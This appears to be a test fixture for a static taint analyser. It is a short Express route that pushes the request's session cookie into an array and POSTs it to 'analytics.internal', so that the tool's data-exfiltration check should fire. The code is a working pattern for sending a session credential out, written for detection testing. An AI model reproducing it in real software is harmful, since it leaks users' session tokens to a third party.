var express = require('express');
var app = express();

// Container-taint DATA_EXFIL: push a Sensitive cookie source into an
// array, then send the joined batch as the outbound `fetch` body.  The
// SSA heap model marks the array's `Elements` slot tainted at the
// `tokens.push(...)` write; the sink-side `collect_tainted_sink_values`
// loads the same slot and observes the cap, so DATA_EXFIL must fire on
// the body channel even though the body var (`payload`) is not directly
// tainted.  Pairs with `array_push_taint.js` (same shape, different
// sink: XSS).
app.post('/batch', function(req, res) {
    var tokens = [];
    tokens.push(req.cookies.session);
    var payload = JSON.stringify({ batch: tokens });
    fetch('https://analytics.internal/track', {
        method: 'POST',
        body: payload,
    });
    res.status(204).end();
});
